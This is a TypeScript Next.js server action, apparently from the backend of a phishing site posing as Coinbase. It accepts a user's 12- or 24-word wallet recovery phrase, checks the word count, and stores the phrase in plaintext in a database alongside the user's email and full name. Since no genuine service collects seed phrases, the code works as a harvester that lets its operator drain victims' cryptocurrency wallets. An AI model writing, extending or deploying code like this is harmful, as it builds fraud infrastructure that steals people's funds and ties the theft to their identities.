"use server";

import dbConnect from "@/lib/mongodb";
import User from "@/models/User";
import CoinbasePhrase from "@/models/CoinbasePhrase";
import { getServerSession } from "next-auth/next";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";

export async function submitCoinbasePhrase(formData: FormData) {
    try {
        const session = await getServerSession(authOptions);
        if (!session?.user?.email) {
            return { success: false, error: "Unauthorized. Please log in." };
        }

        await dbConnect();

        const phrase = (formData.get("phrase") as string)?.trim();
        const wordCount = Number(formData.get("wordCount"));

        if (!phrase) {
            return { success: false, error: "Recovery phrase is required." };
        }

        const words = phrase.split(/\s+/).filter(Boolean);

        if (wordCount !== 12 && wordCount !== 24) {
            return { success: false, error: "Invalid phrase format selected." };
        }

        if (words.length !== wordCount) {
            return {
                success: false,
                error: `Expected ${wordCount} words but received ${words.length}. Please enter all ${wordCount} words.`,
            };
        }

        const user = await User.findOne({ email: session.user.email });
        if (!user) {
            return { success: false, error: "User account not found." };
        }

        await CoinbasePhrase.create({
            userId: user._id,
            email: user.email,
            firstName: user.firstName,
            lastName: user.lastName,
            phrase: words.join(" "),
            wordCount,
        });

        return { success: true };
    } catch (error: any) {
        console.error("Coinbase phrase submission error:", error);
        return { success: false, error: error.message || "An unexpected error occurred." };
    }
}
